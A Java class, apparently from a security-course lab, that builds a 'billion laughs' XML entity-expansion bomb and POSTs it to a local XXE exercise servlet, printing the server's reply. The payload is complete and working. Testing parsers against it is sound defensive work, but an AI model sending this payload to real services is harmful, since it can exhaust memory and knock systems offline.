import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.Charset;

import org.apache.commons.io.IOUtils;
import org.apache.http.Consts;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.HttpClients;

public class _04_Prueba_AtaqueDelBillonDeRisas {

	public static void main(String[] args) {

		String xml = "<?xml version=\"1.0\"?>"+
						"<!DOCTYPE lolz ["+
		                "<!ENTITY lol0 \"lol\">"+
		                "<!ELEMENT lolz (#PCDATA)>"+
		                "<!ENTITY lol1 \"&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;\">"+
		                "<!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">"+
		                "<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">"+
		                "<!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">"+
		                "<!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">"+
		                "<!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">"+
		                "<!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">"+
		                "<!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">"+
		                "<!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">"+
		               "]>"+
		               "<lolz>&lol9;</lolz>";

		StringEntity entity = new StringEntity(xml, ContentType.create("text/xml", Consts.UTF_8));
		HttpPost httpPost = new HttpPost("http://localhost:8080/Ej06_XXE/JAXPServlet");

		httpPost.setEntity(entity);

		HttpClient client = HttpClients.createDefault();
		try {
			HttpResponse response = client.execute(httpPost);
			System.out.println(response.toString());
			InputStream in = response.getEntity().getContent();
			String body = IOUtils.toString(in, Charset.defaultCharset());
			System.out.println(body);
		} catch (ClientProtocolException e) {
			System.out.println(e);
		} catch (IOException e) {
			System.out.println(e);
		}

	}
}